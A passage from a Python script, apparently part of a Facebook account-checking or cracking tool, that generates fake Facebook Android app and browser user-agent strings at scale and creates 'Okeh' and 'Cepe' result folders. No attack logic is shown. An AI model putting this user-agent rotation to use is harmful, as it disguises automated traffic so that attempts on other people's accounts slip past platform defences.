        "device":"realme 10 Pro 5G",
        "cpu":"qcom",
        "build":"TKQ1.221114.001"
    },
    {
        "brand":"realme",
        "manufacturer":"realme",
        "model":"RMX3085",
        "device":"realme 8 5G",
        "cpu":"mt6833",
        "build":"RQ3A.210805.001"
    },
    {
        "brand":"vivo",
        "manufacturer":"vivo",
        "model":"V2339",
        "device":"vivo V30",
        "cpu":"qcom",
        "build":"UP1A.231005.007"
    },
    {
        "brand":"vivo",
        "manufacturer":"vivo",
        "model":"V2318",
        "device":"vivo V29 5G",
        "cpu":"qcom",
        "build":"TQ3A.230805.001"
    },
    {
        "brand":"vivo",
        "manufacturer":"vivo",
        "model":"V2250",
        "device":"vivo Y36",
        "cpu":"qcom",
        "build":"TKQ1.221114.001"
    },
    {
        "brand":"vivo",
        "manufacturer":"vivo",
        "model":"V2149",
        "device":"vivo Y21",
        "cpu":"mt6765",
        "build":"RP1A.200720.012"
    },
    {
        "brand":"OPPO",
        "manufacturer":"OPPO",
        "model":"CPH2631",
        "device":"OPPO Reno11 F",
        "cpu":"mt6877",
        "build":"UKQ1.230924.001"
    },
    {
        "brand":"OPPO",
        "manufacturer":"OPPO",
        "model":"CPH2481",
        "device":"OPPO Reno10 Pro+",
        "cpu":"qcom",
        "build":"TQ3A.230805.001"
    },
    {
        "brand":"OPPO",
        "manufacturer":"OPPO",
        "model":"CPH2467",
        "device":"OPPO A98 5G",
        "cpu":"qcom",
        "build":"TKQ1.221114.001"
    },
    {
        "brand":"OPPO",
        "manufacturer":"OPPO",
        "model":"CPH2239",
        "device":"OPPO A16",
        "cpu":"mt6765",
        "build":"RP1A.200720.012"
    },
    {
        "brand":"Infinix",
        "manufacturer":"Infinix",
        "model":"X6851B",
        "device":"Infinix Note 40 Pro",
        "cpu":"mt6877",
        "build":"UP1A.231005.007"
    },
    {
        "brand":"Infinix",
        "manufacturer":"Infinix",
        "model":"X6731B",
        "device":"Infinix Zero 30 5G",
        "cpu":"mt6885",
        "build":"TQ3A.230805.001"
    },
    {
        "brand":"Infinix",
        "manufacturer":"Infinix",
        "model":"X669D",
        "device":"Infinix Hot 40i",
        "cpu":"ums9230",
        "build":"TKQ1.221114.001"
    },
    {
        "brand":"TECNO",
        "manufacturer":"TECNO",
        "model":"CK8n",
        "device":"TECNO Camon 30",
        "cpu":"mt6877",
        "build":"UP1A.231005.007"
    },
    {
        "brand":"TECNO",
        "manufacturer":"TECNO",
        "model":"BG6",
        "device":"TECNO Spark 20 Pro",
        "cpu":"mt6789",
        "build":"TKQ1.221114.001"
    }])

    locale = random.choice([
    "in_ID",
    "id_ID",
    "en_US",
    "en_GB",
    "en_IN",
    "en_SG",
    "en_AU",
    "en_CA",
    "en_PH",
    "ms_MY",
    "th_TH",
    "vi_VN",
    "fil_PH",
    "zh_CN",
    "zh_TW",
    "ja_JP",
    "ko_KR",
    "fr_FR",
    "de_DE",
    "es_ES",
    "it_IT",
    "pt_BR",
    "ru_RU",
    "tr_TR",
    "ar_SA",
    "en_US_POSIX",
    "in_ID#Latn",
    "en_GB#Latn",
    "id_ID#Latn"
])
    carrier = random.choice([
    "TELKOMSEL",
    "INDOSAT",
    "INDOSATOOREDOO",
    "IM3",
    "XL",
    "AXIS",
    "SMARTFREN",
    "TRI",
    "3ID",
    "BY.U",
    "Singtel",
    "StarHub",
    "M1",
    "CelcomDigi",
    "Maxis",
    "U Mobile",
    "AIS",
    "dtac",
    "TrueMove H",
    "Viettel",
    "Mobifone",
    "Vinaphone",
    "JIO",
    "Airtel",
    "Vi India",
    "BSNL",
    "T-Mobile",
    "Verizon",
    "AT&T",
    "Vodafone",
    "Orange",
    "O2",
    "EE",
    "Claro",
    "Movistar",
    "TELKOMSEL LTE",
    "XL Axiata",
    "SMARTFREN 4G",
    "INDOSAT 5G",
    "AXIS NET",
    "JIO 5G",
    "Airtel LTE"
])
    ua = (
        f"[FBAN/FB4A;"
        f"FBAV/{fbav};"
        f"FBBV/{fbbv};"
        f"FBDM/{{density={density},width={width},height={height}}};"
        f"FBLC/{locale};"
        f"FBRV/0;"
        f"FBCR/{carrier};"
        f"FBMF/{device_data['brand']};"
        f"FBBD/{device_data['brand']};"
        f"FBPN/com.facebook.katana;"
        f"FBDV/{device_data['device']};"
        f"FBSV/{android_version};"
        f"FBOP/1;"
        f"FBCA/arm64-v8a:;"
        f"FBDT/phone;"
        f"FB_FW/1;"
        f"FBRF/0;"
        f"FBSS/3;"
        f"FBID/phone;"
        f"FBLC/{locale};"
        f"FB_FW/1;"
        f"]"
    )
    return ua

ugen = []
for t in range(10000):
    rr = random.randint; rc = random.choice
#----------[ ATRIBUT USER AGENT IPHONE ]---------#     
    versi_iphone = str(rc(["9_3_5","10_3_3","15_4","14_3","13_5","14_5","13_4","17_2_1","12_3_1","17_3","17_2","14_2_1","16_6","13_2_1","14_4_2","12_5_7","9_3_5","11_0_3","11_2_1","9_1","10_2_1","8_3","8_1_2","11_2_6","10_3_2","10_3_1","10_3_3","11_3","10_1_1","11_3_1","11_0_2","10_3_3","10_1_1","10_2_2","9_3_5","11_2_6"]))
    mobile_iphone = str(rc(['13A404','13A344','13A4325c','13A452','13D15','13C75','13B143','13C75','12F69','12A365','12A405','12B410','12B470','12B36','12B440','11B554a','11B651','11D167','11D201','15E148','10A5397e','10A5388e','Y6MLQN','8G7LN3','2783VM','X35XFL','W5T30Y']))
    merek_device = str(rc(["Linux","X11","Macintosh","iPhone","iPad","Android","SmartTV","BlackBerry","SpreadTrum","MAUI Runtime","J2ME/MIDP","Series 60","MTK","iOS","Windows Mobile","Bada","BREW","Tizen"]))
    tipe_kamu = str(rc(["en-IE","ja-JP","pt-BR","de-DE","pl-PL","pt-PT","ru-RU","cs-CZ","de-DE","it-IT","es-BR","tr-TR","pl-PL"]))
    build = str(rc(['MRA58K','JOP24G','NRD90M','O11019','LMY47I','O00623'])) 
    tipe_oppo = str(rc(["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]))
    seri_cubot = str(rc(["MRA58K","JOP24G","NRD90M','O11019","LMY47I","O00623"]))
    versi_cubot = str(rc(["MAGIC","CUBOT","CUBOT_P20","CUBOT CHEETAH 2","CUBOT_NOVA","CUBOT NOTE Plus","CUBOT J9","CUBOT R11","CUBOT_MANITO","CUBOT KING KONG","CUBOT J3 PRO","CUBOT_J3","CUBOT_NOTE_S","CUBOT X18","CUBOT R9","CUBOT_POWER","CUBOT MAX","CUBOT_X18_Plus","CUBOT H3","CUBOT ECHO"]))
    tipe_cubot = str(rc(["Win64; x64","WOW64","Win32; x86","Trident"]))
    seri_viabrowser = str(rc(["N4LEFH","TQ2A","QQ1B","PQ1A","SQ3A","RD1B","LDK2WU","SD2A","AB03E'","Z367Q","R8638","C886H"]))
    model_android = str(rc(["RMX3472","RMX3611","RMX3396","RMX3572","RMX3706","RMX3396","RMX3610", "RMX3371", "RMX3572", "RMX3461", "RMX3311", "RMX3563", "RMX3371", "RMX3269", "RMX3370", "RMX3574", "RMX3661", "RMX3611"]))
    seri_katana = str(rc(["SP1A.210812.016","TP1A.220905.001","SP1A.210812.016","SP1A.210812.016","TP1A.220905.001","TP1A.220905.001","SP1A.210812.016","RKQ1.210503.001","TP1A.220905.001","RKQ1.211119.001","TP1A.220905.001","TP1A.220905.001","RP1A.201005.001","RP1A.201005.001","RKQ1.211119.001"]))
    versi_iphone = str(rc(["9_3_5","10_3_3","15_4","14_3","13_5","14_5","13_4","17_2_1","12_3_1","17_3","17_2","14_2_1","16_6","13_2_1","14_4_2","12_5_7","9_3_5","11_0_3","11_2_1","9_1","10_2_1","8_3","8_1_2","11_2_6","10_3_2","10_3_1","10_3_3","11_3","10_1_1","11_3_1","11_0_2","10_3_3","10_1_1","10_2_2","9_3_5","11_2_6"]))
    tipe_iphone = str(rc(["Y6MLQN","8G7LN3","2783VM","X35XFL","W5T30Y"]))
    tipe_opera = str(rc(["ar","pt","es","ja","ru','en","id","de","fr","en","pl","en-us","fa","da","zh","nl","ssr","el","ca","ta","bn","uk","tr","vi","cs","us"]))
    merek_opera = str(rc(["Macintosh","iPhone","iPad","Android","SmartTV","BlackBerry","SpreadTrum","MAUI Runtime","J2ME/MIDP","Series 60","MTK","iOS","Windows Mobile","Bada","BREW","Tizen"]))
    tipe_smbrowser = str(rc(["SM-A405FN","SM-A346M","SM-J415FN","SM-X706B","SM-J337R4","SM-A9000","SM-G532G","SM-J810M","SM-T280","Mi 9T Pro","Xiaomi 10 Pro","V2231","SM-M546B","22041219I","SM-N970F","SM-A700K","SM-A700S","KINGKONG 5","SC-05L","SAMSUNG SM-A245M","SM-A202K","SAMSUNG SM-A245F","SAMSUNG SM-A125F","SAMSUNG SM-G950U","SAMSUNG SM-A045F","SAMSUNG SM-G996U","SAMSUNG SM-W2021","Infinix X663C","SC-03K","SAMSUNG SM-A135F","SAMSUNG SM-A127F","SAMSUNG SM-J330F","SAMSUNG SM-A127F/A127FXXS7BVK1","SAMSUNG SM-A127F/A127FXXS8CWB1"]))
    tipe_infinix = str(rc(["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]))
    tipe_redmi = str(rc(["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]))
    versi_android = str(rc(['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','29','40']))
    kode_model = str(rc(['AC2003','Samsunh Galaxy S21','Google Pixel 6','OnePlus 10 Pro','Xiaomi Mi 11','Sony Xperia 1 III','Asus ROG Phone 6','Realme GT 2 Pro','Nokia X1000','Motorola Edge 30 Ultra','Huawei P60 Pro','LG Velvet 3','Oppo Find X5 Pro','Vivo X80 Pro+','Lenovo Legion Phone 4 Pro','Google Pixel 7','Xiaomi Redmi Note 12','Samsung Galaxy Z Fold 4','OnePlus Nord 4','Realme GT Neo 3','Sony Xperia 5 IV','Asus ZenFone 9','Motorola Moto G100','Nokia G500','LG Wing 2','Xiaomi Poco F4','Google Pixel 7a','Oppo Reno 7 Pro','Vivo Y90','Samsung Galaxy A53','OnePlus Nord CE 2','Realme Narzo 50','Sony Xperia 10 IV','Asus ZenFone 8 Flip','Motorola Moto E8','Nokia C30','LG K22','Xiaomi Black Shark 5','Google Pixel 7 Pro','Oppo A95','Vivo S10e','Samsung Galaxy M33','OnePlus 10 Lite','Realme Q4 Pro+','Sony Xperia L5','Asus ROG Phone 7','Motorola Moto X9','Nokia X20','LG Q92','Xiaomi Mi Mix 5','Google Pixel Fold','Oppo F21 Pro','Vivo NEX 6','Samsung Galaxy Note 22','OnePlus 10T','Realme V25','Sony Xperia Pro-1','Asus ZenFone 8 Mini','Motorola Defy+','Nokia 7.4','LG V70 ThinQ','Xiaomi Redmi K40 Ultra','Google Pixel 7a XL','Oppo Reno 7 SE','Vivo Y20s','Samsung Galaxy F23','OnePlus Nord N200','Realme C35','Sony Xperia 2','Asus ROG Phone 8','Motorola Moto G9 Play','Nokia X50','LG K32','Xiaomi Poco X4 Pro','Google Pixel 8','Oppo A75','Vivo S1 Prime','Samsung Galaxy A73','OnePlus 10R','Realme GT Neo 4','Sony Xperia L6','Asus ZenFone 9 Lite','Motorola Moto E10','Nokia G700','LG Wing 3','Xiaomi Black Shark 6','Google Pixel 8 Pro','Oppo Reno 8','Vivo Y15','Samsung Galaxy M43','OnePlus Nord CE 3','Realme Narzo 60','Sony Xperia 20','Asus ZenFone 10','Motorola Moto X10','Nokia C40','LG K42','Xiaomi Mi Mix 6','Google Pixel Flip','Oppo F30 Pro','Vivo S20 Ultra']))
#----------[ DAFTAR USER AGENT ]---------#  
    SAMSUNG = f"Mozilla/5.0 (Linux; Android {versi_android}; {kode_model}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,50))}.{str(rr(0,15))} Chrome/{str(rr(50,500))}.{str(rr(50,500))}.{str(rr(50,6000))}.{str(rr(50,500))} Mobile Safari/537.36"
    CUBOT = f"Mozilla/5.0 (Linux; Android {versi_android}; {kode_model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,119))}.0.{str(rr(2000,7000))}.{str(rr(76,199))} Mobile"
    BAIDU = f"Mozilla/5.0 (Linux; Android {versi_android}; {kode_model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,119))}.0.{str(rr(2000,7000))}.{str(rr(76,199))} Mobile Safari/537.36 T7/9.1 baidubrowser/{str(rr(6,8))}.{str(rr(1,25))}.{str(rr(1,25))}.{str(rr(1,200))} (Baidu; P1 {str(rr(1,10))}.{str(rr(1,10))}.{str(rr(1,10))})"
    CHROME = f"Mozilla/5.0 (Linux; Android {versi_android}; {kode_model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,500))}.{str(rr(50,500))}.{str(rr(50,6000))}.{str(rr(50,500))} Mobile Safari/537.36"
    UA_VIERA = f"viabrowser;Safary-Mozilla/5.0 ({merek_device}; U; Viera; {tipe_kamu}) AppleWebKit/537.11 (KHTML, like Gecko) Viera/{str(rr(1,116))}.{str(rr(1,116))}.{str(rr(1,116))} Chrome/{str(rr(1,116))}.{str(rr(1,116))}.{str(rr(1,2006))}.{str(rr(1,116))} Safari/537.11"
    UA_VIERAv2 = f"viabrowser;Safary-Mozilla/5.0 (Linux; U; Viera; {tipe_kamu}) AppleWebKit/537.36 (KHTML, like Gecko) Viera/{str(rr(1,116))}.{str(rr(1,116))}.{str(rr(1,116))} Chrome/{str(rr(1,116))}.{str(rr(1,116))}.{str(rr(1,4000))}.{str(rr(1,300))} Safari/537.36 SmartTV"
    UA_ONPI = f"viabrowser;Safary-Mozilla/5.0 (iPhone; CPU iPhone OS {versi_iphone} like Mac OS X) AppleWebKit/{str(rr(500,1000))}.{str(rr(2,100))} (KHTML, like Gecko) Version/{str(rr(1,25))}.{str(rr(4,80))} Mobile/{tipe_iphone} Safari/{str(rr(500,800))}.{str(rr(2,30))}"
    UA_KTN = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(1,25))}; {model_android} Build/{seri_katana}) [FBAN/FB4A;FBAV/{str(rr(350,450))}.0.0.44.117;FBPN/com.facebook.katana;FBLC/in_ID;FBBV/{str(rr(41000000000,59999999999))};FBCR/Smartfren 100% untuk Indonesia;FBMF/realme;FBBD/realme;FBDV/RMX3760;FBSV/{str(rr(1,25))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1440};FB_FW/1;FBRV/0;] FBBK/1"
    UA_BCD = f"viabrowser;Safary-Mozilla/5.0 (Linux; Android {str(rr(1,25))}; {versi_cubot} Build/{seri_cubot}; wv)AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,119))}.0.{str(rr(2000,7000))}.{str(rr(76,199))} Mobile"
    UA_VBRO = f"viabrowser;Safary-Mozilla/5.0 (Windows NT {str(rr(1,25))}; {tipe_cubot}){seri_viabrowser})AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(55,117))}.0.{str(rr(2883,4000))}.{str(rr(87,150))} UBrowser/{str(rr(7,30))}.0.{str(rr(185,299))}.{str(rr(1002,3000))} Safari/537.36"
    UA_VWIN = f"viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1,20))}; {tipe_cubot}){seri_viabrowser})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Safari/537.36 Vivaldi/6.0.2979.18"
    UA_PPOV = f"Mozilla/5.0 (Linux; U; Android {str(rr(1,25))};{tipe_oppo}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,109))}.0.{str(rr(4896,5414))}.{str(rr(118,127))} Mobile Safari/537.36 OPR/{str(rr(20,50))}.{str(rr(0,1))}.{str(rr(1000,4999))}.{str(rr(70000,209999))}"
    UA_MINUC = f"Mozilla/5.0 (Linux; Android {str(rr(1,25))}; SM-A207F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1,100))}.0.{str(rr(2000,5000))}.{str(rr(1,100))} Mobile Safari/537.36 UCBrowser/11.5.2.1188(SpeedMode) U4/1.0 UCWEB/2.0 (UCMini) Mobile"
    UA_PRA = f"Opera/9.80 ({merek_opera}; Opera Mini/{str(rr(1,200))}.0.{str(rr(1,200))}/{str(rr(1,200))}.{str(rr(1,700))}; U; {tipe_opera}) Presto/{str(rr(1,200))}.{str(rr(1,300))}.{str(rr(1,6000))} Version/{str(rr(1,300))}.{str(rr(1,400))}"
    UA_SMBR = f"Mozilla/5.0 (Linux; Android {str(rr(1,35))}; {tipe_smbrowser} Build/RP1A.{str(rr(500,900000))}.{str(rr(1,500))}; wv) AppleWebKit/{str(rr(1,1000))}.{str(rr(1,500))} (KHTML, like Gecko) SamsungBrowser/{str(rr(1,1000))}.{str(rr(1,100))} Chrome/{str(rr(1,500))}.0.{str(rr(1,10000))}.{str(rr(1,100))} Mobile Safari/537.36"
    UA_IFN = f"Mozilla/5.0 (Linux; Android {str(rr(1,35))}; Infinix {tipe_infinix}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    UA_RDM = f"Mozilla/5.0 (Linux; Android {str(rr(1,35))}; {tipe_redmi} Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
    UA_SMGT = f"SAMSUNG-GT-S3802 Opera/9.80 ({merek_opera}; Opera Mini/7.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {tipe_opera}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    myuseragent = random.choice([SAMSUNG,CUBOT,BAIDU,CHROME,UA_VIERA,UA_VIERAv2,UA_ONPI,UA_KTN,UA_BCD,UA_VBRO,UA_VWIN,UA_PPOV,UA_MINUC,UA_PRA,UA_SMBR,UA_IFN,UA_RDM,UA_SMGT])
    ugen.append(myuseragent)
    
if __name__=='__main__':
	try: os.mkdir('Okeh')
	except: pass
	try: os.mkdir('Cepe')
	except: pass; Main_Menu()